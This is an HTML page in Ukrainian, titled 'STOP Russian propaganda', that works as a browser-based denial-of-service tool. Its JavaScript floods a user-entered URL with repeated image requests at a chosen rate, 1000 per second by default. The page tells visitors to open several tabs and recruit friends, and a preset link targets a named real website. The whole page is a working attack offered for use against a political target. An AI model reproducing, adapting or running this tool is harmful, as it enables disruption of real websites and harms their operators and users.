<html>
<head>
<title>СТОП рос-пропаганда</title>
<style type="text/css">input, button { width: 250px; height: 30px; font-size: 20px; font-weight: bold; margin: 20px 0 20px 0; }</style>

<script type="text/javascript" src="http://w.sharethis.com/button/buttons.js"></script>
<script type="text/javascript">stLight.options({publisher: "eaa63fe6-9ef8-4753-be91-5f60c5e88e24", doNotHash: false, doNotCopy: false, hashAddressBar: false});</script>

</head>
<body style="font-family: Helvetica; font-size: 16px; text-align: center">
<h1>СТОП рос-пропаганда</h1>
<div class="title"><span style="color: red">*</span>Сайт з рос-пропагандой для навантаження</div>
<input type="text" id="targetURL" />
<div class="title">Кiлькiсть запросiв у секунду</div>
<input type="text" id="rps" value="1000" /><br/>
<button id="fireButton" style="height: 60px; font-size: 14px">Почати</button>
<div style="color: #8cbc26">Кiлькiсть запросiв</div>
<div style="font-size: 40px; margin-bottom: 20px" id="succeededCtr">0</div>

<div style="font-size: 14px; margin-bottom: 10px;"><strong>Бажано вiдкривати по декiлька вкладинок за для збiльщення навантаження</strong></div>

<div style="font-size: 20px; margin-bottom: 20px;"><strong>Чим нас бiльше - тим яскравiще ефект. Розповiдайте друзям!!!</strong></div>
<div>

<span class='st_vkontakte_vcount' displayText='Vkontakte'></span>
<span class='st_facebook_vcount' displayText='Facebook'></span>
<span class='st_twitter_vcount' displayText='Tweet'></span>
<span class='st_googleplus_vcount' displayText='Google +'></span>
<span class='st_linkedin_vcount' displayText='LinkedIn'></span>
<span class='st_blogger_vcount' displayText='Blogger'></span>
<span class='st_evernote_vcount' displayText='Evernote'></span>
<span class='st_pinterest_vcount' displayText='Pinterest'></span>
<span class='st__vcount' displayText=''></span>
	
</div>

<div style="margin-bottom: 20px; margin-top: 20px; position:absolute; left: 15px; top: 0px; width: 300px; text-align: left;">
	<strong>Приклади сайтiв: (вiдкриються у новiй вкладцi)</strong>
	<div style="margin-bottom: 5px;">	1. <a href="http://euromaydan.github.io?target=odessa-antimaydan.com" target="_blank">http://odessa-antimaydan.com/</a> </div>
</div>


<script>
var fireInterval;
var isFiring = false;

document.getElementById("fireButton").onclick = function () {
	if (isFiring) {
		clearInterval(fireInterval);
		isFiring = false;
		this.innerHTML = "Почати";
	}
	else {
		isFiring = true;
		this.innerHTML = "Припинити";
		fireInterval = setInterval(
			function () {
				var img = new Image();

				// URL may not be an image
				img.onerror = img.onabort = img.onload = function() { document.getElementById("succeededCtr").innerHTML++; };

				img.setAttribute("src", document.getElementById("targetURL").value);
			},
			(1000 / parseInt(document.getElementById("rps").value) | 1)
		);
	}
};

var queryString = function () {
  // This function is anonymous, is executed immediately and 
  // the return value is assigned to QueryString!
  var query_string = {};
  var query = window.location.search.substring(1);
  var vars = query.split("&");
  for (var i=0;i<vars.length;i++) {
    var pair = vars[i].split("=");
    	// If first entry with this name
    if (typeof query_string[pair[0]] === "undefined") {
      query_string[pair[0]] = pair[1];
    	// If second entry with this name
    } else if (typeof query_string[pair[0]] === "string") {
      var arr = [ query_string[pair[0]], pair[1] ];
      query_string[pair[0]] = arr;
    	// If third or later entry with this name
    } else {
      query_string[pair[0]].push(pair[1]);
    }
  } 
    return query_string;
} ();

var target = queryString.target;
if (target)
{
	document.getElementById("targetURL").value = target;
}

</script>
</body>
</html>
